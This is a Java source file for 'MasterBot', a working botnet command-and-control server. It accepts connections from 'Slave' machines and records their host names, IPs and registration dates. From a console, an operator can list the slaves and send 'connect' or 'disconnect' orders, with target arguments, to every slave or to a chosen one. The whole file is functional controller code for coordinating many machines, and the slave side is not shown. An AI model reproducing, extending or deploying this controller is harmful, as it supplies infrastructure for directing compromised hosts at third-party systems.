import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;

class CommandHandler implements Runnable {

	MasterBot master;

	public CommandHandler(MasterBot master) {
		this.master = master;
	}

	private void parseCommand(String s) {
		if (s == null)
			return;

		String[] tokens = s.split("[ \t]+");

		switch (tokens[0]) {
		case "list":
			master.list();
			break;
		case "connect":
			master.connect(tokens);
			break;
		case "disconnect":
			master.disconnect(tokens);
			break;
		default:
			// System.out.println("Invalid Command!");
		}
	}

	@Override
	public void run() {
		while (true) {

			System.out.print("> ");

			BufferedReader br = new BufferedReader(new InputStreamReader(System.in));

			String s = "";

			try {
				s = br.readLine();
			} catch (IOException e) {
				System.exit(-1);
			}
			if (s != null && s.length() > 2) {
				s.trim();
				parseCommand(s);
			}
		}
	}
}

public class MasterBot {
	public static void main(String[] args) {
		if (args.length != 2 || !args[0].equals("-p")) {
			System.out.println("MasterBot -p port#");
			System.exit(-1);
		}

		MasterBot master = new MasterBot();

		master.port = Integer.parseInt(args[1]);
		master.slaveList = new LinkedList<Slave>();

		(new Thread(new CommandHandler(master))).start();

		ServerSocket listener = null;
		try {
			listener = new ServerSocket(master.port);
		} catch (IOException e) {
			System.exit(-1);
		}

		try {
			while (true) {
				new Thread(new Slave(master, listener.accept())).start();
			}
		} catch (IOException e) {
			e.printStackTrace();
			System.exit(-1);
		}
	}

	private int port;

	private LinkedList<Slave> slaveList;

	public void connect(String[] tokens) {
		if (tokens.length < 2)
			return;

		synchronized (slaveList) {
			int size = slaveList.size();

			if (tokens[1].equalsIgnoreCase("all")) {
				for (int i = 0; i < size; ++i) {
					slaveList.get(i).connect(tokens);
				}

			} else {
				for (int i = 0; i < size; ++i) {
					if (tokens[1].equals(slaveList.get(i).getSlaveIP())
							|| tokens[1].equals(slaveList.get(i).getSlaveHostName())) {
						slaveList.get(i).connect(tokens);
					}
				}
			}
		}
	}

	public void disconnect(String[] tokens) {
		if (tokens.length < 2)
			return;

		synchronized (slaveList) {
			int size = slaveList.size();

			if (tokens[1].equalsIgnoreCase("all")) {
				for (int i = 0; i < size; ++i) {
					slaveList.get(i).disconnect(tokens);
				}

			} else {
				for (int i = 0; i < size; ++i) {
					if (tokens[1].equals(slaveList.get(i).getSlaveIP())
							|| tokens[1].equals(slaveList.get(i).getSlaveHostName())) {
						slaveList.get(i).disconnect(tokens);
					}
				}
			}
		}
	}

	public void list() {
		synchronized (slaveList) {
			updateSlaveList();
			int size = slaveList.size();

			if (size == 0) {
				System.out.println();
				return;
			}

			for (int i = 0; i < size; ++i) {
				System.out.println(slaveList.get(i).toString());
			}
			System.out.flush();
		}
	}

	public void register(Slave slave) {
		synchronized (slaveList) {
			slaveList.add(slave);
		}
	}

	public void updateSlaveList() {
		synchronized (slaveList) {
			int size = slaveList.size();
			for (int i = 0; i < size; ++i) {
				try {
					slaveList.get(i).getSocket().getOutputStream().write(1);
				} catch (Exception e) {
					slaveList.remove(i);
					--size;
					--i;
				}
			}
		}
	}

}

class Slave implements Runnable {

	private MasterBot master;
	private Socket socket;

	private String slaveHostName;
	private String slaveIP;
	private int slavePort;
	private String regDate;

	private BufferedReader in;
	private PrintWriter out;

	public Slave(MasterBot master, Socket socket) {
		this.master = master;
		this.socket = socket;

		this.slaveHostName = this.socket.getInetAddress().getHostName();
		this.slaveIP = this.socket.getInetAddress().getHostAddress();
		this.slavePort = this.socket.getPort();

		try {
			this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			this.out = new PrintWriter(socket.getOutputStream(), true);
		} catch (IOException e) {
			System.exit(-1);
		}

		DateFormat df = new SimpleDateFormat("yyyy-MM-dd");
		Date dateobj = new Date();
		this.regDate = df.format(dateobj);
	}

	public void connect(String[] command) {
		if (!command[0].equalsIgnoreCase("connect")) {
			return;
		}

		String send = command[0];

		for (int i = 2; i < command.length; ++i) {
			send += " " + command[i];
		}

		out.println(send);
	}

	public void disconnect(String[] command) {
		if (!command[0].equalsIgnoreCase("disconnect")) {
			return;
		}

		String send = command[0];

		for (int i = 2; i < command.length; ++i) {
			send += " " + command[i];
		}

		out.println(send);
	}

	public BufferedReader getBufferedReader() {
		return in;
	}

	public PrintWriter getPrintWriter() {
		return out;
	}

	public String getSlaveHostName() {
		return slaveHostName;
	}

	public String getSlaveIP() {
		return slaveIP;
	}

	public Socket getSocket() {
		return socket;
	}

	@Override
	public void run() {
		master.register(this);
	}

	@Override
	public String toString() {
		String toReturn = slaveHostName + "\t" + slaveIP + "\t" + slavePort + "\t" + regDate;
		return toReturn;
	}

}
